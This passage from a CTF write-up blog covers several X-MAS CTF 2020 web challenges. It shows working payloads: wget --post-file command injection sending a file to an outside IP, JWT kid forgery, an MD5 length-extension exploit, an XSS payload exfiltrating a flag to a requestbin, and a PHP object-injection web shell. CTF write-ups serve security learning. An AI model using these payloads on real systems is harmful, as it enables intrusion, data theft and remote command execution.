Blind Command Injection, I could see that using the –post-file option of the wget command as above, the file was read and sent as the POST body value.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">80</span>;</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;</span><br><span class="line">  extended: <span class="literal">true</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;X-MAS!!!!&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(req.body);</span><br><span class="line">res.send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;--------------------------------&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Listening on port &#x27;</span> + PORT + <span class="string">&#x27;...&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;--------------------------------&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>In order to receive the flag, I built a simple server using Node.js to output the POST body value as above.</p><p><code>Payload : $&#123;IFS&#125;-$&#123;IFS&#125;--post-file$&#123;IFS&#125;flag.php$&#123;IFS&#125;141.164.55.161</code></p><p>So, I passed the payload above as the flag value.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/flag_checker/3.png?raw=true"><br>When I checked the server log, I could see the flag.php file came.</p><blockquote><p>FLAG : X-MAS{s0_fL4g_M4ny_IFS_bb69cd55f5f6}</p></blockquote><hr><h2 id="Web-X-MAS-Chan-470-pts"><a href="#Web-X-MAS-Chan-470-pts" class="headerlink" title=" (Web) X-MAS Chan [470 pts]"></a><span style="color:#21C587"></span> (Web) X-MAS Chan [470 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/1.png?raw=true"><br>This time, we will solve the problem called <code>X-MAS Chan</code> among web problems from X-MAS CTF 2020.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/2.png?raw=true"><br>If you come into trouble, you can see there are links and rules that can get you into the board.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/3.png?raw=true"><br>When I came to the board, I can see that the file upload function exists as above. </p><p>And as a result of checking, it was found that only photos such as jpg, png, and gif can be uploaded.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/4.png?raw=true"><br>Also, if you check the source code, you can see that there is getbanner.php, and the logic is logic to get a picture using jwt. <code>You can see that jwt is set as a value in a cookie called banner.</code><br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/5.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;&#x2F;tmp&#x2F;jwt.key&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When the jwt is decoded, you can see that the header part uses the <code>HS256</code> algorithm as above and the kid value is using <code>/tmp/jwt.key</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;banner&quot;: &quot;banner&#x2F;11.gif&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As the data above, you can see that you are receiving a 11.gif photo as the value of the banner. So, if you give <code>flag.php</code> as the <code>value of banner</code>, it will read and return <code>flag.php</code>, not the picture. </p><p>So how do I <code>sign</code> JWT when I don’t know the <code>secret key</code>? </p><p>You can think of the kid value in the header as a pointer to the secret key. In the above jwt, since kid points to <code>/tmp/jwt.key</code>, the value contained in jwt.key can be used as the secret key. </p><p>So, upload a photo using the file upload function, and when the kid points to the photo, you can sign using the binary value of the photo.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/6.png?raw=true"><br>I will make a gif file as above and use it.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/7.png?raw=true"><br>So, when I uploaded the file, you can see the file was created with the path <code>/b/src/1608071199792.gif</code>. Now, if you give the above path as the <code>kid</code> value in the jwt header, you can use the <code>binary value of the above file</code> as the <code>secret key.</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jwt.gif&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    key = fp.read()</span><br><span class="line"></span><br><span class="line">print(jwt.encode(&#123;<span class="string">&#x27;banner&#x27;</span>: <span class="string">&#x27;flag.php&#x27;</span>&#125;, key, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=&#123;<span class="string">&#x27;kid&#x27;</span>: <span class="string">&#x27;/var/www/html/b/src/1608071199792.gif&#x27;</span>&#125;))</span><br></pre></td></tr></table></figure><p>I wrote jwt Signing code as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/8.png?raw=true"><br>If you run the code, you can see jwt appear as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/9.png?raw=true"><br>When I decode jwt and check it, I can see that the value is well entered.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/10.png?raw=true"><br>So when I send a request to getbanner.php using the above jwt, you can see that flag.php is displayed, not the picture.</p><blockquote><p>FLAG : X-MAS{n3v3r_trust_y0ur_us3rs_k1ds-b72dcf5a49498400}</p></blockquote><hr><h2 id="Web-cat-clicker-474-pts"><a href="#Web-cat-clicker-474-pts" class="headerlink" title=" (Web) cat_clicker [474 pts]"></a><span style="color:#21C587"></span> (Web) cat_clicker [474 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/1.png?raw=true"><br>This time, we will solve the problem called <code>Cat Clicker</code> among web problems from X-MAS CTF 2020.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/2.png?raw=true"><br>When it comes to problems, there is logic to buy flags using the number of cats. The fake flag seems to be available for purchase if you have one cat and the real flag is 13 cats.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/3.png?raw=true"><br>You can increase the number of cats by clicking on the face, but it seems like 12 is the maximum.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">state : 12 | 0</span><br><span class="line">hash : cf13ab76afb625f7f7d6c539c2cb3c84</span><br><span class="line"></span><br><span class="line">state : 12 | 1</span><br><span class="line">hash : e71f77e8f7c2c2957292f4a0e1d79d9d</span><br><span class="line"></span><br><span class="line">(Skip)</span><br><span class="line"></span><br><span class="line">state : 12 | 12</span><br><span class="line">hash : 9579729592f72a075bb61f63b8ea238e</span><br></pre></td></tr></table></figure><p>As above, the number of cats is managed by the hash value, and looking at the hash, it seems to be an md5 hash.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/4.png?raw=true"><br>And since this web service has a .git directory, you can pull out all the .git trees.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/5.png?raw=true"><br>I downloaded all the .git trees using gitdumper.sh, and you can lick the source code using the <code>git cat-file -p</code> command.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hashFor</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$secret</span> = getenv(<span class="string">&quot;SECRET_THINGY&quot;</span>); <span class="comment">// 64 random characters - impossible to guess</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;<span class="subst">$secret</span> | <span class="subst">$state</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> md5(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verifyState</span>(<span class="params"><span class="variable">$state</span>, <span class="variable">$hash</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$hash</span> === hashFor(<span class="variable">$state</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCatsNo</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(end(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getParentsLimit</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(reset(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>The above code is the source code of helper.php. If you look at the hashFor function, you are using <code>salt</code>. As such, the hash value cannot be predicted, but you can bypass it using a <code>hash length extension attack</code>. </p><p>Kindly the length of the salt is <code>64</code>, as you can see it shows in the tin. If you don’t know the length of the salt, you need to estimate the length using <code>brute force</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCatsNo</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(end(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And if you look at the getCatsNo function, you can see that the last value of the array is used as the number of cats by using the end function. </p><p>Therefore, when it becomes “<code>12 | 1 | Null Byte | 1000 |</code>“, <code>1000</code> is used as the number of cats. If there is no logic to fetch only the last value of the array, it won’t work.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/6.png?raw=true"><br>So, since I know the salt length, I made a payload using <code>hashpump</code>. (<code>URL encoding</code>)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fetch = <span class="built_in">require</span>(<span class="string">&quot;node-fetch&quot;</span>);</span><br><span class="line">fetch(<span class="string">&#x27;http://challs.xmas.htsp.ro:3003/api/buy.php&#x27;</span>, &#123;</span><br><span class="line">    method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    body: <span class="string">&#x27;item_id=2&amp;state=12%20%7C%201%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%02%00%00%00%00%00%00%20%7C%201000&amp;hash=f48ccd5768b829f8856ae186eb4bf4a4&#x27;</span></span><br><span class="line">&#125;).then(<span class="function">(<span class="params">x</span>) =&gt;</span> x.text()).then(<span class="function">(<span class="params">x</span>) =&gt;</span> <span class="built_in">console</span>.log(x));</span><br></pre></td></tr></table></figure><p>As above, I wrote the exploit code using JavaScript.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/7.png?raw=true"><br>Finally, return the exploit code to see the successful purchase of the flag.</p><blockquote><p>FLAG : X-MAS{1_h4v3_s0_m4ny_c4t5_th4t_my_h0m3_c4n_b3_c0ns1d3r3d_4_c4t_sh3lt3r_aaf30fcb4319effa}</p></blockquote><hr><h2 id="Web-Comfort-Bot-432-pts"><a href="#Web-Comfort-Bot-432-pts" class="headerlink" title=" (Web) Comfort Bot [432 pts]"></a><span style="color:#21C587"></span> (Web) Comfort Bot [432 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Comforn%20Bot/1.png?raw=true"><br>This time, we will solve one of the web problems from X-MAS CTF 2020 called Comfort Bot. </p><p>The peculiarity of the Comfort Bot problem was that it did not have a web server and was solved using the X-MAS bot within Discord. And it provides the source code, so let’s check the source code first.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bot.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> (message.content.startswith (<span class="string">&quot;!&quot;</span>)):</span><br><span class="line">spell = <span class="literal">True</span></span><br><span class="line">response = <span class="keyword">await</span> engine.getCleverResponse (authorID, message.content[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><p>The code above is the part that is executed when the value input from the X-MAS Discord Bot starts with an exclamation mark.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># engine.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">getCleverResponse</span> (<span class="params">authorID, message</span>):</span></span><br><span class="line"><span class="keyword">if</span> (authorID == <span class="number">0</span>):</span><br><span class="line"><span class="keyword">return</span> random.choice([<span class="string">&quot;Oh, I quite certainly agree.&quot;</span>, <span class="string">&quot;There, there, it&#x27;s alright.&quot;</span>, <span class="string">&quot;Oh!&quot;</span>, <span class="string">&quot;Fascinating!&quot;</span>, <span class="string">&quot;Exquisite reply!&quot;</span>, <span class="string">&quot;Running program: COMFORT.&quot;</span>, <span class="string">&quot;Understandable.&quot;</span>, <span class="string">&quot;Hmm.&quot;</span>, <span class="string">&quot;I see.&quot;</span>, <span class="string">&quot;Well, if you really think that...&quot;</span>, <span class="string">&quot;What are you doing?&quot;</span>, <span class="string">&quot;What are you up to?&quot;</span>, <span class="string">&quot;What&#x27;s that?&quot;</span>, <span class="string">&quot;[Nodding]&quot;</span>, <span class="string">&quot;[Nodding and stroking chin saying mhmm]&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">await</span> parseUsers (cleverDriver.getCleverResponse (authorID, message))</span><br></pre></td></tr></table></figure><p>The code above is the getCleverResponse function in engile.py. In the code, you can see that if authorID is <code>0</code>, a random string in the array is printed, and if authorID is <code>not 0</code>, cleverDriver.getCleverResponse function is executed.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># driver.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">getCleverResponse</span> (<span class="params">authorID, txt</span>):</span></span><br><span class="line"><span class="keyword">global</span> driver</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">driver.execute_script(<span class="string">&quot;window.open(&#x27;http://localhost/&#x27;,&#x27;_blank&#x27;);&quot;</span>)</span><br><span class="line">windows[authorID] = driver.window_handles[-<span class="number">1</span>]</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line"></span><br><span class="line">script = <span class="string">&quot;cleverbot.sendAI(&#x27;&#123;0&#125;&#x27;)&quot;</span>.<span class="built_in">format</span> (txt)</span><br><span class="line">driver.execute_script (script)</span><br><span class="line"><span class="keyword">while</span> (driver.execute_script (<span class="string">&quot;return cleverbot.aistate&quot;</span>) != <span class="number">0</span>):</span><br><span class="line"><span class="keyword">await</span> asyncio.sleep (<span class="number">0.4</span>)</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line"></span><br><span class="line">reply = driver.execute_script (<span class="string">&quot;return cleverbot.reply&quot;</span>)</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line">driver.execute_script(<span class="string">&quot;window.close()&quot;</span>)</span><br><span class="line">driver.switch_to_window(driver.window_handles[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> reply</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">CreateCleverDriver ()</span><br></pre></td></tr></table></figure><p>The code above is in the getCleverResmpose function in driver.py!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">script = <span class="string">&quot;cleverbot.sendAI(&#x27;&#123;0&#125;&#x27;)&quot;</span>.<span class="built_in">format</span> (txt)</span><br><span class="line">driver.execute_script (script)</span><br></pre></td></tr></table></figure><p>If you look in the middle, you can see the code above. The <code>txt</code> value is put in the script variable without any verification, and the script is executed using the <code>execute_script</code> function. </p><p>You can trigger XSS in the logic right above.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script = &quot;cleverbot.sendAI(&#x27;!asdf&#x27;);fetch(&#x27;/flag&#x27;).then(x=&gt;x.text()).then(x=&gt;fetch(&quot;URL/?f=&quot; + x));(&#x27;&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>If you manipulate the code and make it as above, the fetch function runs well and you can steal the flag.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!asdf&#39;);fetch(&#39;&#x2F;flag&#39;).then(x&#x3D;&gt;x.text()).then(x&#x3D;&gt;fetch(&quot;https:&#x2F;&#x2F;384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net&#x2F;?f&#x3D; &quot; +x));(&#39;</span><br></pre></td></tr></table></figure><p>So I wrote the payload as above and sent it to the X-MAS Discord Bot.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Comforn%20Bot/2.png?raw=true"><br>Finally, when I checked the requestbin, I could see the flag came.</p><blockquote><p>FLAG : X-MAS{0h_J1nk135!!!Why_w0uld_y0u_br34k_our_commun4l_b07???125184ae}</p></blockquote><hr><h2 id="Web-How-Brutus-stole-492-pts"><a href="#Web-How-Brutus-stole-492-pts" class="headerlink" title=" (Web) How Brutus stole [492 pts]"></a><span style="color:#21C587"></span> (Web) How Brutus stole [492 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/How%20Brutus%20stol/1.png?raw=true"><br>This time, we will solve the problem of How Brutus stole Christmas among the web problems raised by the X-MAS CTF. This problem is a problem that I tried until the last time because I didn’t have enough time to solve it. </p><p>The peculiar thing about this problem is that one CTF site is given as a problem, and the problem is that the CTF site is hacked using the problem in the given CTF site.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pageContent</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$file_name</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$newContent</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="keyword">$this</span>-&gt;file_name=<span class="string">&quot;data/content.txt&quot;</span>; </span><br><span class="line">    <span class="variable">$file</span> = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;newContent=<span class="variable">$file</span>;</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;newContent;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setContent</span>(<span class="params"><span class="variable">$newContent</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;newContent=<span class="variable">$newContent</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;file_name,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fd</span>,<span class="keyword">$this</span>-&gt;newContent);</span><br><span class="line">    fclose(<span class="variable">$fd</span>);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setFooter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;newFooter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$newFooter</span>=unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&quot;newFooter&quot;</span>]));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;footer&quot; style=&quot;color: white&quot;&gt;&#x27;</span>.<span class="variable">$newFooter</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;footer&quot; style=&quot;color: white&quot;&gt;PWNgyan 2020!&lt;/div&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$page</span> = <span class="keyword">new</span> pageContent;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$page</span>;</span><br><span class="line">setFooter();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>I’m going to hack the site using problem 1 on the CTF site. If you come into question 1, you can find the code above.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;file_name,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fwrite(<span class="variable">$fd</span>,<span class="keyword">$this</span>-&gt;newContent);</span><br><span class="line">  fclose(<span class="variable">$fd</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Looking at the code, you can see that when the destructor runs, it creates a file. After seeing this, I thought I should upload a web shell using PHP Object Injection.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:9:&quot;file_name&quot;;s:10:&quot;.&#x2F;abcd.php&quot;;s:10:&quot;newContent&quot;;s:20:&quot;&lt;?php system(&quot;ls&quot;)?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, I just wrote a simple payload and sent it as above, but the file was not created well. So, mentality went out and did this and that, and suddenly <code>as3617</code> released PHP Object Injection PPT.</p><p>Looking at this PPT, I learned that when a variable is defined as Private, Null Byte is attached to both sides of the variable.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:11:&quot;file_name&quot;;s:10:&quot;.&#x2F;abcd.php&quot;;s:12:&quot;newContent&quot;;s:20:&quot;&lt;?php system(&quot;ls&quot;)?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, based on this, I wrote the payload again as above, but it didn’t work well. So I couldn’t solve the problem because of this. </p><p>So, after the contest, I asked a person belonging to Defenit who was all over the web. It turns out that if the variable is defined as private, you need to reference the variable like \x00classname\x00variable.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:22:&quot;�pageContent�file_name&quot;;s:15:&quot;data&#x2F;pyburp.php&quot;;s:23:&quot;�pageContent�newContent&quot;;s:15:&quot;&lt;?&#x3D;&#96;$_GET[x]&#96;?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, finally, I wrote the payload as above.<br><img 